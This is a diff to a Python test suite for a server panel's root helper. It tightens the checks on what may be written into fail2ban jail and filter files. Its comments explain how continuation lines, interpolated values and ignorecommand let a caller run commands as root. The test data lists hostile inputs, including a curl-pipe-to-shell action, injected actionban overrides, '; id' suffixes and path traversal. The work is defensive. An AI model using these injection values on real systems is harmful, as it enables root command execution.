@@ -2125,31 +2125,45 @@ finally:
     _helper.HOME_ROOT, _helper.CONTENT_CRON_PREFIX = _cs_saved_root, _cs_saved_cron
     _shutil.rmtree(_cs_tmp, ignore_errors=True)
 
-# ── fail2ban's two runnable keys ──────────────────────────────────────────────────────────────
-# These four write targets were allowed wholesale, on the reasoning that fail2ban config is
-# declarative and the COMMANDS live in action.d/*.conf, which is not a write target. Two keys
-# undercut that: a jail's `action` names a definition that fail2ban resolves by joining the value
-# onto "action.d", and filter.d/linuxgsm-panel.conf IS a write target — so `action =
-# ../filter.d/linuxgsm-panel` may load a file the caller just wrote, whose actionstart/actionban
-# fail2ban runs as root on reload. I could not verify that traversal (no fail2ban here to test
-# against), so this is a guard against a maybe — and it costs nothing, because the panel writes
-# none of these keys and a legitimate value is a bare name.
+# ── fail2ban: what may be written into a jail or filter file ─────────────────────────────────
+# The four fail2ban write targets were validated one STRIPPED line at a time against a denylist of
+# two "runnable" keys (action*/banaction*, filter, chain: bare names only), everything else
+# accepted. fail2ban runs things as root on ban and on reload, and three shapes walked past that:
+#   * an INDENTED line continues the previous value in configparser, and `action` is multi-line —
+#     the strip() erased the indent, so a second action with an inline `actionban=<cmd>` override
+#     was checked as a line with no `=` and accepted;
+#   * jail values are substituted unescaped into shell commands (<port> in iptables-multiport's
+#     actionstart), and jail.conf's default action interpolates `%(port)s` into
+#     `banaction[port="..."]`, so `port = ssh", actionban="<cmd>` reopened the override;
+#   * `ignorecommand` (run by fail2ban itself) and [INCLUDES] before/after were never on the list.
+# It is an allowlist of the sections and keys the panel writes now, checked over the whole file.
 _helper_src = open(_helper_path, encoding="utf-8").read()
-_f2b_bad = [ln for ln in ("action = ../filter.d/linuxgsm-panel", "banaction = /tmp/evil",
-                          "actionban = curl http://x | sh", "actionstart = /bin/sh -c id",
-                          "banactionallports = ../../x", "filter = ../../etc/passwd",
-                          "chain = ../x")
-            if _helper._fail2ban_line_ok(ln)]
-check("helper fail2ban: a value that names a path is refused for the keys that decide what RUNS",
-      not _f2b_bad, "accepted: %s" % _f2b_bad)
-_f2b_good = [ln for ln in ("action = iptables-multiport", "filter = linuxgsm-panel",
-                           "action_mwl = sendmail-whois-lines", "[linuxgsm-panel]",
-                           "enabled = true", "ignoreip = 127.0.0.1/8 ::1 10.0.0.0/8",
-                           "logpath = /var/log/auth.log",
-                           "failregex = panel login (?:failed|blocked) from <HOST>$")
-             if not _helper._fail2ban_line_ok(ln)]
-check("helper fail2ban: ...and every other key, paths and regexes included, is untouched",
-      not _f2b_good, "refused: %s" % _f2b_good)
+_F2B_ROOT = [
+    ("fail2ban-jail-local",
+     "[sshd]\nenabled = true\naction = iptables-multiport\n    sendmail[actionban=/bin/false ; reboot]\n"),
+    ("fail2ban-jail-local", "[DEFAULT]\nbanaction = iptables\n   mail[actionban=id>/tmp/x]\n"),
+    ("fail2ban-jail-local", '[sshd]\nenabled = true\nport = ssh", actionban="touch /tmp/pwned\n'),
+    ("fail2ban-jail-local", "[sshd]\nport = 22; touch /tmp/pwned\n"),
+    ("fail2ban-panel-jail", "[linuxgsm-panel]\nignorecommand = /bin/sh -c id\n"),
+    ("fail2ban-panel-jail", "[INCLUDES]\nbefore = /home/lgsmpanel/evil.conf\n"),
+    ("fail2ban-panel-jail", "[linuxgsm-panel]\nlogpath = /var/log/x; id\n"),
+    ("fail2ban-panel-jail", "[linuxgsm-panel]\naction = ../filter.d/linuxgsm-panel\n"),
+    ("fail2ban-panel-jail", "[linuxgsm-panel]\nport = %(evil)s\n"),
+    ("fail2ban-panel-jail", "[linuxgsm-panel]\naction: sendmail[actionban=id]\n"),
+    ("fail2ban-panel-jail", "[linuxgsm-panel]\nfilter = linuxgsm-panel\x0cignorecommand = id\n"),
+    ("fail2ban-panel-whitelist", "ignoreip = 10.0.0.1\n"),                    # before any section
+    ("fail2ban-panel-whitelist", "[DEFAULT]\nignoreip = 127.0.0.1/8 ::1%eth0\n"),
+    ("fail2ban-panel-filter", "[Definition]\nactionban = touch /tmp/pwned\n"),
+    ("fail2ban-panel-filter", "[Definition]\nfailregex = x\n    <HOST>\n"),
+]
+_f2b_bad = [(n, b[:48]) for n, b in _F2B_ROOT
+            if _helper._content_ok(b, _helper.WRITE_CONTENT[n])]
+check("helper fail2ban: a continuation, an injected action, ignorecommand, INCLUDES and "
+      "interpolation are all refused", not _f2b_bad, "accepted: %s" % _f2b_bad)
+check("helper fail2ban: ...and the write verb consults that whole-file rule, not a per-line one",
+      all(isinstance(_helper.WRITE_CONTENT[n], _helper._WholeFile)
+          for n in ("fail2ban-jail-local", "fail2ban-panel-whitelist",
+                    "fail2ban-panel-filter", "fail2ban-panel-jail")))
 # The bodies the PANEL actually sends have to pass, or the feature is simply broken.
 from panel.ops.ssh_manager import hosts as _f2b_hosts                              # noqa: E402
 _F2B_BODIES = {
@@ -2161,7 +2175,7 @@ _F2B_BODIES = {
 }
 _f2b_rejected = [n for n, b in _F2B_BODIES.items()
                  if _helper.WRITE_CONTENT[n] is None
-                 or not _helper._lines_match(b, _helper.WRITE_CONTENT[n])]
+                 or not _helper._content_ok(b, _helper.WRITE_CONTENT[n])]
 check("helper fail2ban: every body the panel writes is still accepted", not _f2b_rejected,
       "rejected: %s" % _f2b_rejected)
 
@@ -2384,6 +2398,16 @@ for _k, _v in _WEAKENING:
         _accepted_weak.append("%s: %s" % (_k, _v[:40]))
 check("helper: a sysctl or apt key the panel never writes is refused (no protection switched off)",
       not _accepted_weak, "accepted: %s" % _accepted_weak)
+_accepted_f2b = []
+for _k, _v in _F2B_ROOT:
+    _rc, _written = _write_through_helper(_k, _v)
+    if _rc == 0 or _written is not None:
+        _accepted_f2b.append("%s: %s" % (_k, _v[:40]))
+check("helper: write-file refuses a fail2ban body that would run a command as root",
+      not _accepted_f2b, "accepted: %s" % _accepted_f2b)
+_f2b_real_written = [_k for _k, _v in _F2B_BODIES.items() if _write_through_helper(_k, _v) != (0, _v)]
+check("helper: ...and still writes every fail2ban body the panel sends (positive control)",
+      not _f2b_real_written, "refused: %s" % _f2b_real_written)
 _rc_cron, _written_cron = _write_through_helper("node-tools-cron", "* * * * * root id > /tmp/pwned")
 check("helper: a hostile cron body is replaced by the helper's own, not written",
       _rc_cron == 0 and _written_cron == _helper.NODE_TOOLS_CRON_BODY,
